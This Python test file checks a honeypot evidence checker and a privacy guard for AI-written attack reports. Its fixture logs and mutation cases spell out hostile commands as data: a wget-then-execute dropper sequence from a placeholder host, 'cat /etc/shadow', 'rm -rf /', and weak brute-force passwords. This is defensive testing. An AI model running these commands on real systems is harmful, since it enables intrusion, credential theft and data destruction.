#!/usr/bin/env python3
"""Tests for the writers' privacy guard and the evidence checker. Run: python3 test_checker.py"""
import copy

from checker import WITHHELD, final_record, verify
from reports import FaithfulWriter, build_messages

ok = True


def check(name, cond):
    global ok
    ok &= bool(cond)
    print(("PASS  " if cond else "FAIL  ") + name)


H = "a" * 64


def ev(eventid, t, **kw):
    return {"timestamp": f"2026-11-01T10:00:{t:02d}.000Z", "session": "s1", "src_ip": "host-aaaaaaaa",
            "eventid": eventid, **kw}


# a small planting visit: 4 failed logins, success, commands, one download, run
EVENTS = [
    ev("session.connect", 0, protocol="ssh", dst_port=22),
    ev("login.failed", 1, username="root", password="123456"),
    ev("login.failed", 2, username="root", password="password"),
    ev("login.failed", 3, username="admin", password="admin123"),
    ev("login.failed", 4, username="user", password="1234"),
    ev("login.success", 5, username="admin", password="admin"),
    ev("command.input", 6, input="uname -a"),
    ev("command.input", 7, input="wget http://files.example.invalid/bins.sh"),
    ev("file.download", 8, url="http://files.example.invalid/bins.sh", outfile="bins.sh", shasum=H),
    ev("command.input", 9, input="chmod +x bins.sh"),
    ev("command.input", 10, input="./bins.sh"),
    ev("session.closed", 11, duration=11.0),
]

good, _ = FaithfulWriter().write(EVENTS)
v = verify(EVENTS, good)
check("honest report passes with no failed claims", v["approved"] and v["n_failed"] == 0)
check("honest report mentions the right things",
      "dropper" == good["attack_type"] and H in good["evidence"]["file_hashes"]
      and "run_downloaded_file" in good["behaviors"])


def mutate(fn):
    r = copy.deepcopy(good)
    fn(r)
    return r, verify(EVENTS, r)


r, v = mutate(lambda r: r["evidence"]["urls"].append("http://evil.example.invalid/x.sh"))
check("invented web link is caught and removed",
      not v["approved"] and "http://evil.example.invalid/x.sh" not in v["cleaned"]["evidence"]["urls"])

r, v = mutate(lambda r: r["evidence"]["file_hashes"].append("b" * 64))
check("invented file fingerprint is caught", not v["approved"] and "b" * 64 not in v["cleaned"]["evidence"]["file_hashes"])

r, v = mutate(lambda r: r["evidence"]["commands"].append("cat /etc/shadow"))
check("invented command is caught", not v["approved"])

r, v = mutate(lambda r: r["evidence"]["credentials"].append("root/hunter2"))
check("invented username/password pair is caught", not v["approved"])

r, v = mutate(lambda r: r["evidence"]["credentials"].append("admin/password"))
check("a real username paired with a wrong password is caught (pair must match)", not v["approved"])

r, v = mutate(lambda r: r["evidence"]["addresses"].append("host-deadbeef"))
check("wrong visitor code is caught", not v["approved"])

r, v = mutate(lambda r: r["behaviors"].append("scanning"))
check("unsupported behavior claim is caught and removed",
      not v["approved"] and "scanning" not in v["cleaned"]["behaviors"])

r, v = mutate(lambda r: r.update(summary=r["summary"].replace("4 failed login attempts", "40 failed login attempts")))
check("wrong failed-login count in the summary is caught, summary withheld",
      not v["approved"] and v["cleaned"]["summary"] == WITHHELD)

r, v = mutate(lambda r: r.update(summary=r["summary"] + " It came from 203.0.113.7."))
check("a raw address in the summary is caught", not v["approved"])

r, v = mutate(lambda r: r.update(summary=r["summary"] + " It used http://other.example.invalid/y."))
check("a web link in the summary that is not in the footage is caught", not v["approved"])

r, v = mutate(lambda r: r.update(attack_type="malicious"))
check("an attack type outside the allowed list is caught", not v["approved"])

r, v = mutate(lambda r: r.update(attack_type="recon"))
v2 = verify(EVENTS, r, classifier_type="dropper")
check("wrong-but-allowed attack type is NOT a failed claim, but raises a warning",
      v2["approved"] and len(v2["warnings"]) == 1)

# cleaned reports must themselves pass verification (nothing unverified survives)
r, v = mutate(lambda r: (r["evidence"]["urls"].append("http://evil.example.invalid/x.sh"),
                         r["behaviors"].append("scanning"), r["evidence"]["commands"].append("rm -rf /")))
again = verify(EVENTS, v["cleaned"])
check("cleaned report re-passes verification with zero failed claims", again["n_failed"] == 0)

rec = final_record("s1", v, "dropper")
check("final record carries only verified evidence and a danger level",
      rec["danger_level"] == "red" and "http://evil.example.invalid/x.sh" not in rec["evidence"]["urls"]
      and rec["verification"]["claims_removed"] == 3)

# privacy guard: text with an IP-shaped string must never be built into a prompt
leaky = copy.deepcopy(EVENTS)
leaky[0]["src_ip"] = "203.0.113.7"
try:
    build_messages(leaky)
    check("privacy guard refuses to build a prompt containing a raw address", False)
except RuntimeError:
    check("privacy guard refuses to build a prompt containing a raw address", True)
check("anonymised visit builds a prompt fine", len(build_messages(EVENTS)) == 2)

print("\nALL TESTS PASSED" if ok else "\nSOME TESTS FAILED")
raise SystemExit(0 if ok else 1)
